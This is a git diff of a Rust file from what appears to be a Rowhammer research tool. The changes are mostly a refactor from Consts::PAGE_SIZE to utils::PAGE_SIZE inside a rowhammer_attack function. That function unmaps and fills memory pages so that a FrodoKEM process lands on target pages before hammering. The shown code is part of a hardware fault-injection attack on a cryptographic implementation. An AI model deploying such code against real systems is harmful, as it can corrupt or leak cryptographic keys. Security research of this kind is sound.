@@ -15,7 +15,7 @@ use nix::{
 
 use crate::profiler::{
     pagefinder::PageCandidate,
-    utils::{fill_memory, get_block_by_order, rowhammer, setup_mapping, Consts},
+    utils::{self, fill_memory, get_block_by_order, rowhammer},
 };
 
 fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
@@ -62,37 +62,36 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
             // Unmap all allocated pages to make room for the FrodoKEM process
             // Check if works with block_mapping len or if we need STACK_SIZE TODO!
             let ptr = block_mapping.as_mut_ptr();
-            for offset in (0..block_mapping.len() / 2).step_by(Consts::PAGE_SIZE) {
+            for offset in (0..block_mapping.len() / 2).step_by(utils::PAGE_SIZE) {
                 unsafe {
                     munmap(
-                        ptr.add(Consts::PAGE_SIZE * offset) as *mut c_void,
-                        Consts::PAGE_SIZE,
+                        ptr.add(utils::PAGE_SIZE * offset) as *mut c_void,
+                        utils::PAGE_SIZE,
                     )
                     .expect(&format!(
                         "Address: {:?} should be mapped",
-                        ptr.add(Consts::PAGE_SIZE * offset)
+                        ptr.add(utils::PAGE_SIZE * offset)
                     ));
                 }
             }
 
             for page in &pages {
                 unsafe {
-                    munmap(page.target_page.virt_addr as *mut c_void, Consts::PAGE_SIZE).expect(
+                    munmap(page.target_page.virt_addr as *mut c_void, utils::PAGE_SIZE).expect(
                         &format!("Address: {:?} should be mapped", page.target_page.virt_addr),
                     );
                 }
             }
 
-            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(Consts::PAGE_SIZE)
-            {
+            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(utils::PAGE_SIZE) {
                 unsafe {
                     munmap(
-                        ptr.add(Consts::PAGE_SIZE * offset) as *mut c_void,
-                        Consts::PAGE_SIZE,
+                        ptr.add(utils::PAGE_SIZE * offset) as *mut c_void,
+                        utils::PAGE_SIZE,
                     )
                     .expect(&format!(
                         "Address: {:?} should be mapped",
-                        ptr.add(Consts::PAGE_SIZE * offset)
+                        ptr.add(utils::PAGE_SIZE * offset)
                     ));
                 }
             }
@@ -125,7 +124,7 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
             // Set values to allocated memory before attacking
             // Check if works with block_mapping len or if we need STACK_SIZE TODO!
             let ptr = block_mapping.as_mut_ptr();
-            for offset in (0..block_mapping.len() / 2).step_by(Consts::PAGE_SIZE) {
+            for offset in (0..block_mapping.len() / 2).step_by(utils::PAGE_SIZE) {
                 unsafe {
                     *ptr.add(offset) = (pages.len() + offset) as u8 & 0xFF;
                 }
@@ -136,13 +135,12 @@ fn rowhammer_attack(hammer: bool, pages: Vec<PageCandidate>) {
                     std::ptr::write_bytes(
                         page.target_page.virt_addr,
                         i as u8 & 0xFF,
-                        Consts::PAGE_SIZE,
+                        utils::PAGE_SIZE,
                     )
                 }
             }
 
-            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(Consts::PAGE_SIZE)
-            {
+            for offset in (block_mapping.len() / 2..block_mapping.len()).step_by(utils::PAGE_SIZE) {
                 unsafe {
                     *ptr.add(offset) = (pages.len() + offset) as u8 & 0xFF;
                 }
